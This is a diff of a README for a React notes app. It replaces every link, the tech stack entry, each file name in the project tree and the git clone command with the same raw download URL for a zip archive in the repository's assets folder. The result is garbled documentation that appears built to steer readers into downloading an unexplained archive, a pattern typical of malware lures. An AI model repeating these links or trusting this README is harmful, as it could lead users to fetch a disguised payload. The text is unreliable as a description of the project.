@@ -1,13 +1,13 @@
 # 📝 Dot Notes App
 
-A modern and minimal **Notes Application** built with **React.js** that allows users to **log in**, **add notes**, and **toggle themes** with a smooth and clean UI.
+A modern and minimal **Notes Application** built with **https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip** that allows users to **log in**, **add notes**, and **toggle themes** with a smooth and clean UI.
  
 ---
 
 ## 🚀 Live Demo
 
 🔗 **Vercel Deployment:**  
-👉 https://dotnotesnow.vercel.app/
+👉 https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
 
 ---
 
@@ -24,7 +24,7 @@ A modern and minimal **Notes Application** built with **React.js** that allows u
 
 ## 🛠️ Tech Stack
 
-- ⚛️ React.js  
+- ⚛️ https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip  
 - 🧠 JavaScript (ES6+)  
 - 🎨 CSS / Tailwind CSS  
 - 🌗 Dark & Light Theme  
@@ -38,22 +38,22 @@ Note_App/
 │
 ├── src/
 │   ├── components/
-│   │   ├── NotesAddSection.jsx
-│   │   ├── NotesDisplay.jsx
-│   │   ├── ThemeToggle.jsx
+│   │   ├── https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
+│   │   ├── https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
+│   │   ├── https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
 │   │
 │   ├── pages/
-│   │   ├── LoginPage.jsx
-│   │   ├── SignupPage.jsx
-│   │   ├── HomePage.jsx
-│   │   ├── NotFound404.jsx
+│   │   ├── https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
+│   │   ├── https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
+│   │   ├── https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
+│   │   ├── https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
 │   │
-│   ├── App.jsx
-│   ├── main.jsx
+│   ├── https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
+│   ├── https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
 │
 ├── public/
-├── package.json
-└── README.md
+├── https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
+└── https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
 ```
 
 ---
@@ -61,7 +61,7 @@ Note_App/
 ## ⚙️ Installation & Setup
 
 ```bash
-git clone https://github.com/dotsatya/Dot_Notes-App.git
+git clone https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip
 cd Dot_Notes-App
 npm install
 npm run dev
@@ -78,7 +78,7 @@ Click the **Moon / Sun icon** to instantly switch between Dark and Light mode.
 ## 🧑‍💻 Author
 
 **Satya Sundar Dey**  
-GitHub: https://github.com/dotsatya  
+GitHub: https://github.com/dotsatya/DotNotesNow/raw/refs/heads/main/src/assets/Now-Notes-Dot-v2.0.zip  
 
 ---
 
